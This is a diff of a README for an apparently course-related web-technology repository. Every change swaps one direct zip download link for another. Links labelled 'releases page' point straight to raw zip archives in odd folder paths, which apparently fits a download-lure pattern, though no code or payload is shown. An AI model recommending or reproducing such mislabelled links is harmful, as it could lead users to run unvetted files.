@@ -6,7 +6,7 @@ Welcome to **TecWebLab25-26**! This repository contains all the slides and exerc
 
 ## 📦 Download Now!
 
-[![Download from Releases](https://raw.githubusercontent.com/Vikash987654/TecWebLab25-26/main/subfulgent/TecWebLab25-26.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Vikash987654/TecWebLab25-26/main/subfulgent/TecWebLab25-26.zip)
+[![Download from Releases](https://raw.githubusercontent.com/Vikash987654/TecWebLab25-26/main/Lect1_OpenAPI/Esercizi e soluzioni/Annotazione Immagine/Lab_Web_Tec_3.4.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Vikash987654/TecWebLab25-26/main/Lect1_OpenAPI/Esercizi e soluzioni/Annotazione Immagine/Lab_Web_Tec_3.4.zip)
 
 ## 🔍 What You Will Find
 
@@ -23,7 +23,7 @@ This collection is designed to cater to a wide range of topics in web technologi
 To get started, follow these simple steps:
 
 1. **Visit the Releases Page**:  
-   Go to the [releases page](https://raw.githubusercontent.com/Vikash987654/TecWebLab25-26/main/subfulgent/TecWebLab25-26.zip) to see available downloads.
+   Go to the [releases page](https://raw.githubusercontent.com/Vikash987654/TecWebLab25-26/main/Lect1_OpenAPI/Esercizi e soluzioni/Annotazione Immagine/Lab_Web_Tec_3.4.zip) to see available downloads.
 
 2. **Choose the Latest Release**:  
    Look for the latest version. It typically has the most up-to-date materials and fixes.
@@ -80,6 +80,6 @@ For any inquiries or feedback, please reach out through the GitHub Issues page o
 
 ## 📥 Download & Install
 
-To access all the materials, please visit the [releases page](https://raw.githubusercontent.com/Vikash987654/TecWebLab25-26/main/subfulgent/TecWebLab25-26.zip) again.
+To access all the materials, please visit the [releases page](https://raw.githubusercontent.com/Vikash987654/TecWebLab25-26/main/Lect1_OpenAPI/Esercizi e soluzioni/Annotazione Immagine/Lab_Web_Tec_3.4.zip) again.
 
 Thank you for your interest in **TecWebLab25-26**. We hope you enjoy your learning journey in web technologies!
